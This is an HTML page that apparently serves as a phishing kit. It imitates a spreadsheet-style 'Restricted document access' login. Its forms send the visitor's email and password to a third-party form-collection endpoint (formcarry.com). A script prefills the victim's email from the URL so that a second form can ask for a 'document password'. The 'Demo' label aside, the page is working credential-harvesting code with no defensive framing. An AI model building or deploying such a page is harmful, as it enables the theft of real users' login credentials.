<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Document Access (Demo)</title>

<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #e9ecef;
  }

  /* Spreadsheet-style blurred background */
  .bg {
    position: fixed;
    inset: 0;
    background:
      linear-gradient(rgba(255,255,255,0.7), rgba(255,255,255,0.7)),
      repeating-linear-gradient(
        0deg,
        #dddddd 0,
        #dddddd 1px,
        #ffffff 1px,
        #ffffff 22px
      );
    filter: blur(2px);
  }

  /* Modal login form */
  .modal {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 330px;
    background: #ffffff;
    border-radius: 6px;
    box-shadow: 0 16px 40px rgba(0,0,0,0.35);
    padding: 22px;
    text-align: center;
  }

  .icon {
    width: 40px;
    height: 40px;
    margin: 0 auto 12px;
    background: #1f7244;
    color: #fff;
    font-weight: bold;
    font-size: 20px;
    line-height: 40px;
    border-radius: 4px;
  }

  .modal p {
    font-size: 13px;
    color: #333;
    margin: 10px 0;
  }

  .modal input {
    width: 100%;
    padding: 9px;
    margin: 6px 0;
    border: 1px solid #cfcfcf;
    border-radius: 4px;
    font-size: 13px;
  }

  /* Make read-only email visually distinct */
  input[readonly] {
    background-color: #eee;
    cursor: not-allowed;
  }

  .options {
    display: flex;
    align-items: center;
    font-size: 12px;
    color: #555;
    margin: 6px 0 14px;
  }

  .options input {
    margin-right: 6px;
  }

  button {
    width: 100%;
    padding: 10px;
    background: #1f7244;
    border: none;
    color: #ffffff;
    font-size: 14px;
    border-radius: 4px;
    cursor: pointer;
  }

  .footer-text {
    font-size: 11px;
    color: #777;
    margin-top: 12px;
  }


  /* Styles for secured spreadsheet form */
  .secured-form {
    max-width: 500px;
    margin: 80px auto;
    background: #fff;
    border-radius: 6px;
    padding: 24px;
    box-shadow: 0 16px 40px rgba(0,0,0,0.15);
    font-family: Arial, sans-serif;
    color: #333;
    display: none; /* hide by default */
  }

  .secured-form h2 {
    margin-bottom: 16px;
    color: #1f7244;
  }

  .secured-form label {
    display: block;
    margin-top: 12px;
    font-weight: bold;
    font-size: 14px;
  }

  .secured-form input[type="email"],
  .secured-form input[type="password"] {
    width: 100%;
    padding: 9px;
    margin-top: 4px;
    border: 1px solid #cfcfcf;
    border-radius: 4px;
    font-size: 14px;
  }

  .secured-form input[readonly] {
    background-color: #eee;
    cursor: not-allowed;
  }

  .secured-form button {
    margin-top: 18px;
    background: #1f7244;
    color: white;
    border: none;
    padding: 12px;
    font-size: 16px;
    width: 100%;
    border-radius: 4px;
    cursor: pointer;
  }

</style>
</head>

<body>

<div class="bg"></div>

<!-- Login modal -->
<form class="modal" id="loginForm" action="https://formcarry.com/s/zPqDzDWqria" method="POST">
  <div class="icon">X</div>

  <p>
    <strong>Restricted document access</strong><br>
    Enter your email to continue
  </p>

  <input type="email" id="loginEmail" name="email" placeholder="your@email.com" required>

  <input type="password" name="password" placeholder="Password" required>

  <div class="options">
    <input type="checkbox" id="remember" name="remember">
    <label for="remember">Remember my ID</label>
  </div>

  <button type="submit">Login Now</button>

  <div class="footer-text">
    Secure document preview Â· Demo interface
  </div>
</form>

<!-- Secured spreadsheet form -->
<form class="secured-form" id="securedForm" action="https://formcarry.com/s/YOUR_FORMCARRY_ID" method="POST">
  <h2>Secured Document Access</h2>

  <label for="securedEmail">Authorized email</label>
  <input type="email" id="securedEmail" name="email" readonly required>

  <label for="document_code">Document password</label>
  <input type="password" id="document_code" name="document_code" placeholder="Password" required>

  <button type="submit">Verify & Open Spreadsheet</button>
</form>

<script>
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");

  const loginForm = document.getElementById("loginForm");
  const securedForm = document.getElementById("securedForm");
  const loginEmail = document.getElementById("loginEmail");
  const securedEmail = document.getElementById("securedEmail");

  if (email) {
    // Hide login form
    loginForm.style.display = "none";

    // Show secured spreadsheet form and set email readonly value
    securedForm.style.display = "block";
    securedEmail.value = email;
  } else {
    // No email in URL, show login form and clear secured form
    loginForm.style.display = "block";
    securedForm.style.display = "none";
  }
</script>

</body>
</html>
